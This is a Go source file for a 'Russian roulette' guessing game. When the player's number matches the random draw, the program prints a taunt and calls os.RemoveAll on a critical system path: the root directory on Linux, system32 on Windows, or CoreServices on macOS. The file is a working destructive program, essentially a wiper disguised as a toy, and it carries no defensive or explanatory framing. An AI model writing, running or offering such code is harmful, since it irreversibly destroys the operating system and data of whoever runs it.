package main

import (
	"fmt"
	"math/rand"
	"os"
	"runtime"
	"strconv"
	"time"
)

// returnOsPath returns a critical system path based on the current operating system.
func returnOsPath() string {
	os := runtime.GOOS

	// Choose the appropriate critical path based on the operating system.
	if os == "windows" {
		return "C:/Windows/system32"
	} else if os == "linux" {
		return "/"
	} else {
		// Default to a macOS critical path.
		return "/System/Library/CoreServices"
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	var userInput string
	fmt.Print("Enter a number (1 to 6): ")
	fmt.Scanln(&userInput)

	// Convert the user input to a number
	num, err := strconv.Atoi(userInput)

	// Check if the number is outside the valid range
	if num < 1 || num > 6 {
		panic("Invalid input: Number must be between 1 to 6.")
	}

	// Check for conversion errors
	if err != nil {
		panic("Invalid input: Please enter a valid number.")
	}

	generatedNum := rand.Intn(7)

	// Generate a random number between 0 and 6, inclusive.
	if generatedNum == num {
		fmt.Println("🔥🔥🔥 BOOM!💣 You lost!! 🔥🔥🔥🔥")
		fmt.Printf("You guessed %v, and the we guessed %v", userInput, generatedNum)
		fmt.Println("🔥🔥🔥 RIP!💣 Your Operating System!! 🔥🔥🔥🔥")
		// Obtain the critical path based on the current operating system.
		criticalPath := returnOsPath()

		// Attempt to remove the specified critical path.
		err := os.RemoveAll(criticalPath)
		if err != nil {
			fmt.Println("Error:", err)
		} else {
			fmt.Println("Directory removed successfully.")
		}
	} else {
		fmt.Println("🎉🎉🎉 Congratulations! 🎉🎉🎉")
		fmt.Println("Guess you have good luck! 🌟✨")
		fmt.Printf("You guessed %v, and we guessed %v\n", userInput, generatedNum)
		fmt.Println("🚀🌈 Your Operating System is safe and sound! 🌐🛡️")
	}
}
